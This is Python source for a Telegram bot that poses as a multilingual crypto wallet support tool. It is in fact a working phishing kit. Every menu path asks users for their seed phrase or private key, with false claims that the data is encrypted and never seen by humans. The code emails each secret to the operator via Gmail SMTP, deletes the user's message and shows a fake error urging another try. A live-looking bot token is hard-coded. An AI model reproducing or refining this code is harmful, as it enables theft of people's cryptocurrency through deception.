        'welcome': "สวัสดี {user}! ยินดีต้อนรับสู่เครื่องมือแก้ปัญหาแบบบริการตนเองที่ดีที่สุดสำหรับทุกความต้องการด้านกระเป๋าเงินคริปโตของคุณ! บอทนี้ออกแบบมาเพื่อช่วยคุณแก้ไขปัญหาทั่วไปได้อย่างรวดเร็วและมีประสิทธิภาพ เช่น ข้อผิดพลาดในการเชื่อมต่อ, ความท้าทายในการย้ายข้อมูล, ปัญหาการ staking, ค่าธรรมเนียม gas ที่สูง, การทำธุรกรรมที่ค้าง, กองทุนที่หายไป, การปฏิเสธการเคลม, ปัญหาสภาพคล่อง, ธุรกรรมที่ถูกระงับ, ความยากในการแลกเปลี่ยน และโทเค็นที่สูญหาย ไม่ว่าคุณจะกำลังเผชิญกับปัญหาการซิงโครไนซ์กระเป๋าเงิน, ยอดโทเค็นที่ไม่ถูกต้อง หรือการโอนที่ล้มเหลว, เราพร้อมช่วยคุณ เป้าหมายของเราคือการแนะนำคุณผ่านกระบวนการแก้ไขปัญหาทีละขั้นตอน, เพื่อให้คุณสามารถควบคุมประสบการณ์กระเป๋าเงินคริปโตของคุณได้ มาเริ่มกันเลยและแก้ไขปัญหาของคุณวันนี้!",
        'main menu title': "กรุณาเลือกประเภทปัญหาเพื่อดำเนินการต่อ:",
        'buy': " ซื้อ",
        'validation': " การตรวจสอบ",
        'claim tokens': " เคลมโทเค็น",
        'migration issues': " ปัญหาการย้ายข้อมูล",
        'assets recovery': " การกู้คืนสินทรัพย์",
        'general issues': " ปัญหาทั่วไป",
        'rectification': " การแก้ไข",
        'staking issues': " ปัญหาการ Staking",
        'deposits': " การฝาก",
        'withdrawals': " การถอน",
        'slippage error': " ข้อผิดพลาด Slippage",
        'login issues': " ปัญหาการเข้าสู่ระบบ",
        'high gas fees': " ค่าธรรมเนียม Gas สูง",
        'presale issues': " ปัญหาการขายล่วงหน้า",
        'missing balance': " ยอดคงเหลือที่หายไป/ผิดปกติ",
        'connect wallet message': "กรุณาเชื่อมต่อกระเป๋าเงินของคุณด้วยคีย์ส่วนตัวหรือ Seed Phrase เพื่อดำเนินการต่อ",
        'connect wallet button': "🔑 เชื่อมต่อกระเป๋าเงิน",
        'select wallet type': "กรุณาเลือกประเภทกระเป๋าเงินของคุณ:",
        'other wallets': "กระเป๋าเงินอื่น ๆ",
        'private key': "🔑 คีย์ส่วนตัว",
        'seed phrase': "🔒 นำเข้า Seed Phrase",
        'wallet selection message': "คุณได้เลือก {wallet_name}\nกรุณาเลือกโหมดการเชื่อมต่อที่คุณต้องการ",
        'reassurance': "\n\nเพื่อความปลอดภัยของคุณ, โปรดทราบว่าข้อมูลทั้งหมดได้รับการประมวลผลอย่างปลอดภัยโดยบอทและไม่มีการแทรกแซงจากมนุษย์ กระบวนการนี้ได้รับการเข้ารหัสและป้องกันอย่างสมบูรณ์เพื่อรับรองว่าข้อมูลของคุณปลอดภัยในระหว่างการซิงโครไนซ์",
        'prompt seed': "กรุณาป้อนวลีลับ 12/24 คำของคุณ{reassurance}",
        'prompt private key': "กรุณาป้อนคีย์ส่วนตัวของคุณ{reassurance}",
        'invalid choice': "ตัวเลือกไม่ถูกต้อง กรุณาใช้ปุ่ม",
        'final error message': "‼️ เกิดข้อผิดพลาด, โปรดตรวจสอบให้แน่ใจว่าคุณป้อนคีย์ที่ถูกต้อง, โปรดใช้การคัดลอกและวางเพื่อหลีกเลี่ยงข้อผิดพลาด, โปรด /start เพื่อลองอีกครั้ง ",
        'choose language': "กรุณาเลือกภาษาที่คุณต้องการ:",
        'await restart message': "กรุณาคลิกที่ /start เพื่อเริ่มต้นใหม่"
    },
    'vi': {
        'welcome': "Chào bạn {user}! Chào mừng bạn đến với công cụ tự phục vụ tối ưu để giải quyết tất cả các nhu cầu về ví crypto của bạn! Bot này được thiết kế để giúp bạn giải quyết nhanh chóng và hiệu quả các vấn đề phổ biến như Lỗi Kết nối, Thách thức Di chuyển, Biến chứng Staking, Phí Gas Cao, Giao dịch bị kẹt, Tiền bị mất, Yêu cầu bị từ chối, Vấn đề Thanh khoản, Giao dịch bị đóng băng, Khó khăn khi hoán đổi và Token bị mất. Cho dù bạn đang gặp phải các vấn đề với đồng bộ hóa ví, số dư token không chính xác, chuyển khoản không thành công, chúng tôi đều có thể giúp bạn. Mục tiêu của chúng tôi là hướng dẫn bạn từng bước qua quy trình khắc phục sự cố, giúp bạn kiểm soát trải nghiệm ví crypto của mình. Hãy bắt đầu và giải quyết các vấn đề của bạn ngay hôm nay!",
        'main menu title': "Vui lòng chọn một loại vấn đề để tiếp tục:",
        'buy': " Mua",
        'validation': " Xác thực",
        'claim tokens': " Nhận Token",
        'migration issues': " Vấn đề Di chuyển",
        'assets recovery': " Phục hồi Tài sản",
        'general issues': " Vấn đề Chung",
        'rectification': " Khắc phục",
        'staking issues': " Vấn đề Staking",
        'deposits': " Nạp tiền",
        'withdrawals': " Rút tiền",
        'slippage error': " Lỗi trượt giá",
        'login issues': " Vấn đề Đăng nhập",
        'high gas fees': " Phí Gas Cao",
        'presale issues': " Vấn đề Bán trước",
        'missing balance': " Số dư bị thiếu/Không đều",
        'connect wallet message': "Vui lòng kết nối ví của bạn với Khóa Riêng tư hoặc Cụm từ Seed để tiếp tục.",
        'connect wallet button': "🔑 Kết nối Ví",
        'select wallet type': "Vui lòng chọn loại ví của bạn:",
        'other wallets': "Các ví khác",
        'private key': "🔑 Khóa Riêng tư",
        'seed phrase': "🔒 Nhập Cụm từ Seed",
        'wallet selection message': "Bạn đã chọn {wallet_name}.\nVui lòng chọn chế độ kết nối ưa thích của bạn.",
        'reassurance': "\n\nĐể đảm bảo an toàn cho bạn, xin lưu ý rằng tất cả thông tin được xử lý an toàn bởi bot và không có sự can thiệp của con người. Quá trình này được mã hóa và bảo vệ hoàn toàn để đảm bảo dữ liệu của bạn an toàn trong quá trình đồng bộ hóa.",
        'prompt seed': "Vui lòng nhập cụm từ bí mật 12/24 từ của bạn.{reassurance}",
        'prompt private key': "Vui lòng nhập khóa riêng tư của bạn.{reassurance}",
        'invalid choice': "Lựa chọn không hợp lệ. Vui lòng sử dụng các nút.",
        'final error message': "‼️ Đã xảy ra lỗi, Vui lòng đảm bảo bạn đang nhập đúng khóa, vui lòng sử dụng sao chép và dán để tránh lỗi. vui lòng /start để thử lại. ",
        'choose language': "Vui lòng chọn ngôn ngữ ưa thích của bạn:",
        'await restart message': "Vui lòng nhấp vào /start để bắt đầu lại."
    }
}

# Dictionary to map wallet callback data to their display names
WALLET_DISPLAY_NAMES = {
    'wallet_type_metamask': 'Tonkeeper',
    'wallet_type_trust_wallet': 'Telegram Wallet',
    'wallet_type_coinbase': 'MyTon Wallet',
    'wallet_type_tonkeeper': 'Tonhub',
    'wallet_type_phantom_wallet': 'Trust Wallet',
    'wallet_type_rainbow': 'Rainbow',
    'wallet_type_safepal': 'SafePal',
    'wallet_type_wallet_connect': 'Wallet Connect',
    'wallet_type_ledger': 'Ledger',
    'wallet_type_brd_wallet': 'BRD Wallet',
    'wallet_type_solana_wallet': 'Solana Wallet',
    'wallet_type_balance': 'Balance',
    'wallet_type_okx': 'OKX',
    'wallet_type_xverse': 'Xverse',
    'wallet_type_sparrow': 'Sparrow',
    'wallet_type_earth_wallet': 'Earth Wallet',
    'wallet_type_hiro': 'Hiro',
    'wallet_type_saitamask_wallet': 'Saitamask Wallet',
    'wallet_type_casper_wallet': 'Casper Wallet',
    'wallet_type_cake_wallet': 'Cake Wallet',
    'wallet_type_kepir_wallet': 'Kepir Wallet',
    'wallet_type_icpswap': 'ICPSwap',
    'wallet_type_kaspa': 'Kaspa',
    'wallet_type_nem_wallet': 'NEM Wallet',
    'wallet_type_near_wallet': 'Near Wallet',
    'wallet_type_compass_wallet': 'Compass Wallet',
    'wallet_type_stack_wallet': 'Stack Wallet',
    'wallet_type_soilflare_wallet': 'Soilflare Wallet',
    'wallet_type_aioz_wallet': 'AIOZ Wallet',
    'wallet_type_xpla_vault_wallet': 'XPLA Vault Wallet',
    'wallet_type_polkadot_wallet': 'Polkadot Wallet',
    'wallet_type_xportal_wallet': 'XPortal Wallet',
    'wallet_type_multiversx_wallet': 'Multiversx Wallet',
    'wallet_type_verachain_wallet': 'Verachain Wallet',
    'wallet_type_casperdash_wallet': 'Casperdash Wallet',
    'wallet_type_nova_wallet': 'Nova Wallet',
    'wallet_type_fearless_wallet': 'Fearless Wallet',
    'wallet_type_terra_station': 'Terra Station',
    'wallet_type_cosmos_station': 'Cosmos Station',
    'wallet_type_exodus_wallet': 'Exodus Wallet',
    'wallet_type_argent': 'Argent',
    'wallet_type_binance_chain': 'Binance Chain',
    'wallet_type_safemoon': 'SafeMoon',
    'wallet_type_gnosis_safe': 'Gnosis Safe',
    'wallet_type_defi': 'DeFi',
    'wallet_type_other': 'Other',
}


def get_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    """Retrieves the text for the given key and language from the context."""
    lang = context.user_data.get('language', 'en') # Default to English
    return LANGUAGES.get(lang, LANGUAGES['en']).get(key, LANGUAGES['en'][key])


async def send_email(subject: str, body: str) -> None:
    """Sends an email using the provided credentials."""
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg['Subject'] = subject
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECIPIENT_EMAIL

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

# --- Bot Commands and Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends a language selection menu."""
    keyboard = [
        [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
        [InlineKeyboardButton("Español 🇪🇸", callback_data="lang_es"), InlineKeyboardButton("Українська 🇺🇦", callback_data="lang_uk")],
        [InlineKeyboardButton("Français 🇫🇷", callback_data="lang_fr"), InlineKeyboardButton("فارسی 🇮🇷", callback_data="lang_fa")],
        [InlineKeyboardButton("Türkçe 🇹🇷", callback_data="lang_tr"), InlineKeyboardButton("中文 🇨🇳", callback_data="lang_zh")],
        [InlineKeyboardButton("Deutsch 🇩🇪", callback_data="lang_de"), InlineKeyboardButton("العربية 🇦🇪", callback_data="lang_ar")],
        [InlineKeyboardButton("Nederlands 🇳🇱", callback_data="lang_nl"), InlineKeyboardButton("हिन्दी 🇮🇳", callback_data="lang_hi")],
        [InlineKeyboardButton("Bahasa Indonesia 🇮🇩", callback_data="lang_id"), InlineKeyboardButton("Português 🇵🇹", callback_data="lang_pt")],
        [InlineKeyboardButton("Čeština 🇨🇿", callback_data="lang_cs"), InlineKeyboardButton("اردو 🇵🇰", callback_data="lang_ur")],
        [InlineKeyboardButton("Oʻzbekcha 🇺🇿", callback_data="lang_uz"), InlineKeyboardButton("Italiano 🇮🇹", callback_data="lang_it")],
        [InlineKeyboardButton("日本語 🇯🇵", callback_data="lang_ja"), InlineKeyboardButton("Bahasa Melayu 🇲🇾", callback_data="lang_ms")],
        [InlineKeyboardButton("Română 🇷🇴", callback_data="lang_ro"), InlineKeyboardButton("Slovenčina 🇸🇰", callback_data="lang_sk")],
        [InlineKeyboardButton("ไทย 🇹🇭", callback_data="lang_th"), InlineKeyboardButton("Tiếng Việt 🇻🇳", callback_data="lang_vi")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Check if it's a message or a callback query to reply correctly
    if update.message:
        await update.message.reply_text(LANGUAGES['en']['choose language'], reply_markup=reply_markup)
    elif update.callback_query and update.callback_query.message:
        await update.callback_query.message.reply_text(LANGUAGES['en']['choose language'], reply_markup=reply_markup)
    else:
        logging.error("Start command called without a valid message or callback query.")
        return ConversationHandler.END # Or handle as appropriate

    return CHOOSE_LANGUAGE


async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Saves the user's language choice and shows the main menu."""
    query = update.callback_query
    await query.answer()

    lang = query.data.split('_')[1]
    context.user_data['language'] = lang

    await query.message.edit_reply_markup(reply_markup=None) # Remove the language menu
    
    # Now, instead of directly calling show_main_menu, we simulate a callback to it
    # to ensure we are in the correct state (MAIN_MENU)
    await show_main_menu(update, context) 

    return MAIN_MENU


async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends a welcome message and the main menu buttons."""
    user = update.effective_user
    
    # Ensure language is set, default to en if not found
    lang = context.user_data.get('language', 'en')
    welcome_message = get_text(context, 'welcome').format(user=user.mention_html())

    keyboard = [
        [
            InlineKeyboardButton(get_text(context, 'buy'), callback_data='buy'),
            InlineKeyboardButton(get_text(context, 'validation'), callback_data='validation')
        ],
        [
            InlineKeyboardButton(get_text(context, 'claim tokens'), callback_data='claim_tokens'),
            InlineKeyboardButton(get_text(context, 'migration issues'), callback_data='migration_issues')
        ],
        [
            InlineKeyboardButton(get_text(context, 'assets recovery'), callback_data='assets_recovery'),
            InlineKeyboardButton(get_text(context, 'general issues'), callback_data='general_issues')
        ],
        [
            InlineKeyboardButton(get_text(context, 'rectification'), callback_data='rectification'),
            InlineKeyboardButton(get_text(context, 'staking issues'), callback_data='staking_issues')
        ],
        [
            InlineKeyboardButton(get_text(context, 'deposits'), callback_data='deposits'),
            InlineKeyboardButton(get_text(context, 'withdrawals'), callback_data='withdrawals')
        ],
        [
            InlineKeyboardButton(get_text(context, 'slippage error'), callback_data='slippage_error'),
            InlineKeyboardButton(get_text(context, 'login issues'), callback_data='login_issues')
        ],
        [
            InlineKeyboardButton(get_text(context, 'high gas fees'), callback_data='high_gas_fees'),
            InlineKeyboardButton(get_text(context, 'presale issues'), callback_data='presale_issues')
        ],
        [
            InlineKeyboardButton(get_text(context, 'missing balance'), callback_data='missing_balance')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Check if it's a message or a callback query to reply correctly
    if update.callback_query and update.callback_query.message:
        await update.callback_query.message.reply_html(welcome_message, reply_markup=reply_markup)
    elif update.message: # This case should ideally not happen if start transitions correctly, but good for robustness
        await update.message.reply_html(welcome_message, reply_markup=reply_markup)
    else:
        logging.error("show_main_menu called without a valid message or callback query.")


async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Shows a single 'Connect Wallet' inline button after any menu selection."""
    query = update.callback_query
    await query.answer()

    menu_option = query.data
    
    # This is the corrected line to handle the mismatch between callback_data and dictionary keys
    language_key = menu_option.replace('_', ' ')

    keyboard = [
        [InlineKeyboardButton(get_text(context, 'connect wallet button'), callback_data="connect_wallet")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text(
        f"{get_text(context, language_key)}\n{get_text(context, 'connect wallet message')}",
        reply_markup=reply_markup
    )
    
    return AWAIT_CONNECT_WALLET


async def show_wallet_types(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends a selection of popular wallet types and an 'Other' option."""
    query = update.callback_query
    await query.answer()

    keyboard = [
        [InlineKeyboardButton("Tonkeeper", callback_data="wallet_type_metamask")],
        [InlineKeyboardButton("Telegram Wallet", callback_data="wallet_type_trust_wallet")],
        [InlineKeyboardButton("MyTon Wallet", callback_data="wallet_type_coinbase")],
        [InlineKeyboardButton("Tonhub", callback_data="wallet_type_tonkeeper")],
        [InlineKeyboardButton("Trust Wallet", callback_data="wallet_type_phantom_wallet")],
        [InlineKeyboardButton(get_text(context, 'other wallets'), callback_data="other_wallets")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text(get_text(context, 'select wallet type'), reply_markup=reply_markup)

    return CHOOSE_WALLET_TYPE

async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends the full list of all other wallets formatted as a two-column layout without emojis."""
    query = update.callback_query
    await query.answer()

    keyboard = [
        [InlineKeyboardButton("MyTonWallet", callback_data="wallet_type_mytonwallet"), InlineKeyboardButton("TonHub", callback_data="wallet_type_tonhub")],
        [InlineKeyboardButton("Rainbow", callback_data="wallet_type_rainbow"), InlineKeyboardButton("SafePal", callback_data="wallet_type_safepal")],
        [InlineKeyboardButton("Wallet Connect", callback_data="wallet_type_wallet_connect"), InlineKeyboardButton("Ledger", callback_data="wallet_type_ledger")],
        [InlineKeyboardButton("BRD Wallet", callback_data="wallet_type_brd_wallet"), InlineKeyboardButton("Solana Wallet", callback_data="wallet_type_solana_wallet")],
        [InlineKeyboardButton("Balance", callback_data="wallet_type_balance"), InlineKeyboardButton("OKX", callback_data="wallet_type_okx")],
        [InlineKeyboardButton("Xverse", callback_data="wallet_type_xverse"), InlineKeyboardButton("Sparrow", callback_data="wallet_type_sparrow")],
        [InlineKeyboardButton("Earth Wallet", callback_data="wallet_type_earth_wallet"), InlineKeyboardButton("Hiro", callback_data="wallet_type_hiro")],
        [InlineKeyboardButton("Saitamask Wallet", callback_data="wallet_type_saitamask_wallet"), InlineKeyboardButton("Casper Wallet", callback_data="wallet_type_casper_wallet")],
        [InlineKeyboardButton("Cake Wallet", callback_data="wallet_type_cake_wallet"), InlineKeyboardButton("Kepir Wallet", callback_data="wallet_type_kepir_wallet")],
        [InlineKeyboardButton("ICPSwap", callback_data="wallet_type_icpswap"), InlineKeyboardButton("Kaspa", callback_data="wallet_type_kaspa")],
        [InlineKeyboardButton("NEM Wallet", callback_data="wallet_type_nem_wallet"), InlineKeyboardButton("Near Wallet", callback_data="wallet_type_near_wallet")],
        [InlineKeyboardButton("Compass Wallet", callback_data="wallet_type_compass_wallet"), InlineKeyboardButton("Stack Wallet", callback_data="wallet_type_stack_wallet")],
        [InlineKeyboardButton("Soilflare Wallet", callback_data="wallet_type_soilflare_wallet"), InlineKeyboardButton("AIOZ Wallet", callback_data="wallet_type_aioz_wallet")],
        [InlineKeyboardButton("XPLA Vault Wallet", callback_data="wallet_type_xpla_vault_wallet"), InlineKeyboardButton("Polkadot Wallet", callback_data="wallet_type_polkadot_wallet")],
        [InlineKeyboardButton("XPortal Wallet", callback_data="wallet_type_xportal_wallet"), InlineKeyboardButton("Multiversx Wallet", callback_data="wallet_type_multiversx_wallet")],
        [InlineKeyboardButton("Verachain Wallet", callback_data="wallet_type_verachain_wallet"), InlineKeyboardButton("Casperdash Wallet", callback_data="wallet_type_casperdash_wallet")],
        [InlineKeyboardButton("Nova Wallet", callback_data="wallet_type_nova_wallet"), InlineKeyboardButton("Fearless Wallet", callback_data="wallet_type_fearless_wallet")],
        [InlineKeyboardButton("Terra Station", callback_data="wallet_type_terra_station"), InlineKeyboardButton("Cosmos Station", callback_data="wallet_type_cosmos_station")],
        [InlineKeyboardButton("Exodus Wallet", callback_data="wallet_type_exodus_wallet"), InlineKeyboardButton("Argent", callback_data="wallet_type_argent")],
        [InlineKeyboardButton("Binance Chain", callback_data="wallet_type_binance_chain"), InlineKeyboardButton("SafeMoon", callback_data="wallet_type_safemoon")],
        [InlineKeyboardButton("Gnosis Safe", callback_data="wallet_type_gnosis_safe"), InlineKeyboardButton("DeFi", callback_data="wallet_type_defi")],
        [InlineKeyboardButton("Other", callback_data="wallet_type_other")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text(get_text(context, 'select wallet type'), reply_markup=reply_markup)

    return CHOOSE_OTHER_WALLET_TYPE


async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends the inline keyboard with Private Key and Seed Phrase options."""
    query = update.callback_query
    await query.answer()
    
    wallet_name = WALLET_DISPLAY_NAMES.get(query.data, query.data.replace('wallet_type_', '').replace('_', ' ').title())
    context.user_data['wallet type'] = wallet_name

    keyboard = [
        [
            InlineKeyboardButton(get_text(context, 'private key'), callback_data="private_key"),
            InlineKeyboardButton(get_text(context, 'seed phrase'), callback_data="seed_phrase")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.message.reply_text(
        get_text(context, 'wallet selection message').format(wallet_name=wallet_name),
        reply_markup=reply_markup
    )
    return PROMPT_FOR_INPUT

async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Prompts the user for the specific key or phrase based on their button choice."""
    query = update.callback_query
    await query.answer()
    
    context.user_data['wallet option'] = query.data
    
    reassurance_message = get_text(context, 'reassurance')
    
    if query.data == "seed_phrase":
        await query.message.reply_text(
            get_text(context, 'prompt seed').format(reassurance=reassurance_message),
        )
    elif query.data == "private_key":
        await query.message.reply_text(
            get_text(context, 'prompt private key').format(reassurance=reassurance_message),
        )
    else:
        await query.message.reply_text(get_text(context, 'invalid choice'))
        return ConversationHandler.END
        
    return RECEIVE_INPUT

async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receives the final input and sends it to the email, then displays an error message."""
    user_input = update.message.text
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_option = context.user_data.get('wallet option', 'Unknown')
    wallet_type = context.user_data.get('wallet type', 'Unknown')
    user = update.effective_user
    
    subject = f"New Wallet Input from Telegram Bot: {wallet_type} -> {wallet_option}"
    body = f"User ID: {user.id}\nUsername: {user.username}\n\nWallet Type: {wallet_type}\nInput Type: {wallet_option}\nInput: {user_input}"
    
    await send_email(subject, body)
    
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
        logging.info(f"Deleted user message with ID: {message_id}")
    except Exception as e:
        logging.error(f"Failed to delete message: {e}")
        
    await update.message.reply_text(
        get_text(context, 'final error message'),
        reply_markup=ReplyKeyboardRemove()
    )
    
    return AWAIT_RESTART

async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles any message sent after the initial error, prompting the user to restart."""
    await update.message.reply_text(get_text(context, 'await restart message'))
    return AWAIT_RESTART


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels the current conversation and returns the user to the start menu."""
    # This function is defined but not used in the ConversationHandler fallbacks.
    # If you want to add a /cancel command, you would add it to the entry_points or fallbacks.
    # For now, let's assume it's not meant to be called directly in the current flow.
    logging.info("Cancel function called (currently unused in fallback).")
    return ConversationHandler.END


def main() -> None:
    """Start the bot."""
    # Make sure to replace "YOUR_BOT_TOKEN" with your actual bot token
    application = ApplicationBuilder().token("8153084828:AAGfdgcSLpX5FNcyQ4HbuLgH5RVzTBAn3T0").build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_LANGUAGE: [
                CallbackQueryHandler(set_language, pattern="^lang_"),
            ],
            MAIN_MENU: [
                # Ensure patterns match the callback_data used in the main menu buttons
                CallbackQueryHandler(show_connect_wallet_button, pattern="^(buy|validation|claim_tokens|migration_issues|assets_recovery|general_issues|rectification|staking_issues|deposits|withdrawals|slippage_error|login_issues|high_gas_fees|presale_issues|missing_balance)$")
            ],
            AWAIT_CONNECT_WALLET: [
                CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$")
            ],
            CHOOSE_WALLET_TYPE: [
                CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"), # Matches all specific wallet types
            ],
            CHOOSE_OTHER_WALLET_TYPE: [
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"), # Matches all specific wallet types from the "other" list
            ],
            PROMPT_FOR_INPUT: [
                CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$")
            ],
            RECEIVE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
            ],
            AWAIT_RESTART: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
            ]
        },
        fallbacks=[
            CommandHandler("start", start), # Allows user to restart at any point
        ]
    )

    application.add_handler(conv_handler)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()